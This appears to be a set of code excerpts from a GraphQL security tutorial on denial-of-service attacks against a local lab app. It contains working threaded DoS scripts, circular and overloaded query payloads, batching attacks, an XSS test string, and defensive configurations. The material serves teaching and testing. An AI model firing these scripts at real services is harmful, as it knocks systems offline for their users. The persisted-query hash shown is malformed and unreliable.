["```\ntype Paste {\n  title: String\n  content: String\n}\n```", "```\ntype Paste {\n  title: String\n  content: String\n **user_agent: String**\n **ip_address: String**\n}\n```", "```\ntype Owner {\n  ip_address: String\n  user_agent: String\n  name: String\n}\n```", "```\ntype Paste {\n  title: String\n  content: String\n  user_agent: String\n  ip_address: String\n **owner: Owner**\n}\n```", "```\ntype Paste {\n    title: String\n    content: String\n    user_agent: String\n    ip_address: String\n    owner: Owner\n}\n\n type Owner {\n    ip_address: String\n    user_agent: String\n    pastes: [Paste]\n    name: String\n}\n```", "```\nquery {\n  pastes {\n    owner {\n      pastes {\n        owner {\n          pastes {\n            owner {\n              name\n            }\n          }\n }\n      }\n    }\n  }\n}\n```", "```\ntype PasteObject {\n  `--snip--`\n  id: ID!\n  ipAddr: String\n  ownerId: Int\n burn: Boolean\n❶ owner: OwnerObject\n  `--snip--`\n}\n\ntype OwnerObject {\n  id: ID!\n  name: String\n❷ paste: [PasteObject]\n  `--snip--`\n}\n```", "```\n# **inql -f /home/kali/introspection_query.json --generate-cycles -o dvga_cycles**\n[!] Parsing local schema file\n[+] Writing Introspection Schema JSON\n[+] Writing query Templates\nWriting systemUpdate query\nWriting pastes query\n[+] Writing mutation Templates\nWriting createPaste mutation\n[+] Writing Query Cycles to introspection_query\n[+] DONE\n```", "```\n# **cat dvga_cycles/introspection_query/cycles***\n\nCycles(\n        { OwnerObject -[paste]-> PasteObject -[owner]-> OwnerObject }\n        { OwnerObject -[pastes]-> PasteObject -[owner]-> OwnerObject }\n)\n```", "```\n# **inql -t http://localhost:5013/graphql --generate-cycles -o dvga_cycles**\n[+] Writing Introspection Schema JSON\n[+] DONE\nWriting pastes query\n[+] Writing mutation Templates\nWriting importPaste mutation\n[+] DONE\n[+] Writing Query Cycles to localhost:5013\n```", "```\n# **cd ~**\n# **echo 'http://localhost:5013/graphql' > hosts.txt**\n# **cat hosts.txt**\nhttp://localhost:5013/graphql\n```", "```\nfor host in $(cat hosts.txt); do\n    inql -t \"$host\" --generate-cycles\ndone\n```", "```\nquery {\n  pastes {\n    owner {\n      pastes {\n        owner {\n          name\n        }\n      }\n    }\n  }\n}\n```", "```\ntype __Schema {\n  `--snip--`\n  types: ❶ [__Type!]!\n  queryType: __Type!\n  mutationType: __Type\n  subscriptionType: __Type\n  directives: [__Directive!]!\n  `--snip--`\n}\n\ntype ❷ __Type {\n  `--snip--`\n  name: String\n  description: String\n  fields(includeDeprecated: Boolean = false): ❸ [__Field!]\n  `--snip--`\n}\n\ntype ❹ __Field {\n  `--snip--`\n  name: String!\n  description: String\n  args: [__InputValue!]!\n  type: ❺ __Type!\n  isDeprecated: Boolean!\n  `--snip--`\n}\n```", "```\nquery {\n  __schema {\n    types {\n      fields {\n        type {\n          fields {\n            type {\n              fields {\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```", "```\nquery {\n  pastes {\n **...Start**\n  }\n}\n\nfragment **Start** on **PasteObject** {\n  title\n  content\n}\n```", "```\n\"pastes\": [\n  {\n    \"title\": \"My Title\",\n    \"content\": \"My First Paste\"\n  }\n]\n```", "```\nquery CircularFragment {\n  pastes {\n    **...Start**\n  }\n}\n\nfragment **Start** on PasteObject {\n  title\n  content\n  **...End**\n}\n\nfragment **End** on PasteObject {\n  **...Start**\n}\n```", "```\nquery {\n  pastes {\n     title\n     content\n  }\n}\n```", "```\nquery {\n  pastes {\n     title\n     content\n     content\n     content\n     content\n     content\n  }\n}\n```", "```\n{\n  \"data\": {\n    \"pastes\": [\n      {\n        \"title\": \"My Title\",\n        \"content\": \"My First Paste\"\n      }\n    ]\n  }\n}\n```", "```\n**query {**\n **pastes {**\n **content**\n **}**\n**}**\n```", "```\nTHREADS = 50\n\n❶ payload = 'content \\n title \\n' * 1000\n❷ query = {'query':'query { \\n ' + payload + '}'}\n\n❸ def DoS():\n    try:\n      r = requests.post(GRAPHQL_URL, json=query)\n      print('Time took: {} seconds '.format(r.elapsed.total_seconds()))\n      print('Response:', r.json())\n    except Exception as e:\n      print('Error', e.message)\n\n❹ while True:\n    print('Running...')\n    time.sleep(2)\n    for _ in range(THREADS):\n      t = threading.Thread(target=DoS, args=())\n      t.start()\n```", "```\n# **python3 exploit_threaded_field_dup.py http://localhost:5013/graphql**\n```", "```\n**query {**\n **systemUpdate**\n**}**\n```", "```\nquery {\n  one:systemUpdate\n  two:systemUpdate\n  three:systemUpdate\n  four:systemUpdate\n  five:systemUpdate\n}\n```", "```\n# **python3 -c 'for i in range(0, 10): print(\"q\"+str(i)+\":\"+\"systemUpdate\")'**\n\nq0:systemUpdate\nq1:systemUpdate\nq2:systemUpdate\n```", "```\nquery {\n  q1:pastes {\n    owner {\n      pastes {\n        owner {\n          name\n        }\n      }\n    }\n  }\n  q2:pastes {\n    owner {\n      pastes {\n        owner {\n name\n        }\n      }\n    }\n  }\n}\n```", "```\nquery {\n   pastes {\n      title @aa@aa@aa@aa # add as many directives as possible\n      content @aa@aa@aa@aa\n   }\n}\n```", "```\n# **python3 exploit_directive_overloading.py http://localhost:5013/graphql 30000**\n```", "```\nURL = sys.argv[1]\nFORCE_MULTIPLIER = int(sys.argv[2])\n\ndef start_attack():\n  payload = '@dos' * FORCE_MULTIPLIER\n  query = {'query': 'query  { __typename ' + payload + ' }'}\n  try:\n    r = requests.post(URL, json=query, verify=False)\n    print('\\t HTTP Response', r.text)\n    print('\\t HTTP Code: '  , str(r.status_code))\n  except:\n    pass\n\nthreads = []\n\nwhile True:\n  time.sleep(2)\n  start = time.time()\n  start_attack()\n  print(f'Time request took: {time.time() - start}')\n\n  for i in range(300):\n t = threading.Thread(target=start_attack)\n    threads.append(t)\n    t.start()\n\n  for t in threads:\n    t.join()\n```", "```\ntype Query {\n  pastes: [PasteObject]!\n}\n```", "```\nquery {\n   pastes(limit:100000, public: true) {\n     content\n   }\n}\n```", "```\nSELECT content FROM pastes WHERE public = true LIMIT 100000\n```", "```\n[\n  query {\n   ipAddr\n   title\n   content\n  }\n  query {\n   ipAddr\n   title\n content\n  }\n]\n```", "```\n# **curl http://localhost:5013/graphql -H \"Content-Type: application/json\"**\n**-d '[{\"query\":\"query {systemHealth}\"},{\"query\":\"query {systemHealth}\"}]'**\n\n[\n  {\"data\":{\"systemHealth\":\"System Load: 0.03  \\n\"}},\n  {\"data\":{\"systemHealth\":\"System Load: 0.03  \\n\"}}\n]\n```", "```\nimport requests\n\nqueries = [\n  {\"query\":\"query {systemHealth}\"},\n  {\"query\":\"query {systemHealth}\"}\n]\n\nr = requests.post('http://localhost:5013/graphql', json=queries)\n\nprint(r.json())\n```", "```\n# **cd ~/Desktop**\n# **python3 array_based_batch_query.py**\n\n[\n   {'data': {'systemHealth': 'System Load: 1.49\\n'}},\n   {'data': {'systemHealth': 'System Load: 1.49\\n'}}\n]\n```", "```\n{'errors': [{'message': 'Batch GraphQL requests are not enabled.'}]}\n```", "```\nquery {\n  pastes {      # level 1\n    owner {     # level 2\n      pastes {  # level 3\n        owner { # level 4\n          name  # level 5\n        }\n      }\n    }\n  }\n}\n```", "```\nARRAY_LENGTH = 5\nFIELD_REPEAT = 10\n\nquery = {\"query\":\"query {\"}\nfield_1_name = 'pastes'\nfield_2_name = 'owner'\n\ncount = 0\nfor _ in range(FIELD_REPEAT):\n    count += 1\n    closing_braces = '} ' * FIELD_REPEAT * 2  + '}'\n    payload = \"{0} {{ {1} {{ \".format(field_1_name, field_2_name)\n    query[\"query\"] += payload\n\n    if count == FIELD_REPEAT:\n      query[\"query\"] += '__typename' + closing_braces\n`--snip--`\nqueries = []\nfor _ in range(ARRAY_LENGTH):\n  queries.append(query)\n\nr = requests.post('http://localhost:5013/graphql', json=queries)\n\nprint(r.json())\n```", "```\n# **python3 array_based_circular_queries.py**\n\nQuery: query {pastes { owner { `...` } } }\nQuery Repeated: 10 times\nQuery Depth: 21 levels\nArray Length: 5 elements\n```", "```\nrepeated_query_list = \"query { assetnote: Query { hacktheplanet } }\"\nrepeated_query_dict = [{\"query\": repeated_query_list}, {\"query\":  repeated_query_list}]\nrepeated_query_success = False\ntry:\n  r = requests.post(args.endpoint, headers=header_dict,\n      json=repeated_query_dict, proxies=proxies, verify=False)\n  error_count = len(r.json())\n  `--snip--`\n  if error_count > 1:\n    print(\"Query JSON list based batching: GraphQL batching is possible...\n          preflight request was successful.\")\n```", "```\n# **cd BatchQL**\n# **python3 batch.py -e http://localhost:5013/graphql**\n\nCSRF GET based successful. Please confirm that this is a valid issue.\nCSRF POST based successful. Please confirm that this is a valid issue.\nQuery name based batching: GraphQL batching is possible... preflight request was successful.\nQuery JSON list based batching: GraphQL batching is possible...preflight request was successful.\n```", "```\n# **cd ~/graphql-cop**\n# **python3 graphql-cop.py -t http://localhost:5013/graphql**\n\n                    GraphQL Cop\n           Security Auditor for GraphQL\n             Dolev Farhi & Nick Aleks\n\n[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service)\n[HIGH] Batch Queries - Batch queries allowed with 10+ simultaneous queries (Denial of Service)\n[HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field\n       (Denial of Service)\n[HIGH] Directive Overloading - Multiple duplicated directives allowed in a query\n       (Denial of Service)\n```", "```\nquery {\n  pastes {\n    title\n    content\n    userAgent\n    ipAddr\n    owner {\n      name\n    }\n  }\n}\n```", "```\ndirective @cost(\n  complexity: Int = 1\n) on FIELD_DEFINITION | OBJECT\n\ntype PasteObject {\n  title: String @cost(complexity: 1)\n  content: String @cost(complexity: 1)\n  userAgent: String @cost(complexity: 5)\n  ipAddr: String @cost(complexity: 5)\n}\n```", "```\nquery {\n  pastes {\n    title     # cost: 1\n    content   # cost: 1\n    userAgent # cost: 5\n    ipAddr    # cost: 5\n  }\n}\n```", "```\n{\n  \"data\": {\n`--snip--`\n  },\n  \"extensions\": {\n    \"cost\": {\n      \"credits_total\": 1000,\n \"credits_remaining\": 990,\n    }\n  }\n}\n```", "```\nclass MySchema < GraphQL::Schema\n `--snip--`\n  **max_depth 10**\nend\n```", "```\nschema = Schema(query=MyQuery)\n\nvalidation_errors = validate(\n    schema=schema.graphql_schema,\n    document_ast=parse('THE QUERY'),\n    rules=(\n        **depth_limit_validator(**\n **max_depth=20**\n **),**\n    )\n)\n```", "```\napp.add_url_rule('/graphql', view_func=GraphQLView.as_view(\n  'graphql',\n  schema=schema,\n `--snip--`\n  **batch=True**\n))\n```", "```\ndef resolve_pastes(self, info, public=False):\n    query = PasteObject.get_query(info)\n    return query.filter_by(public=public, burn=False).order_by(Paste.id.desc())**.limit(100)**\n```", "```\n{\n   \"persisted_query\": {\n      \"sha256Hash\": \"5e734424cfdde58851234791dea3811caf8e8b389cc3aw7035044ce91679757bc8\"\n   }\n }\n```", "```\n# **echo -n \"{query{pastes{owner{id}}}}\" | sha256sum**\n\n5e734424cfdde58851234791dea3811caf8e8b389cc3aw7035044ce91679757bc8\n```", "```\nclass MySchema < GraphQL::Schema\n  use GraphQL::Schema::**Timeout, max_seconds: 20**\nend\n```", "```\nmutation {\n  changeName(name:\"<script>alert(1)</script>\") {\n      name\n  }\n}\n```"]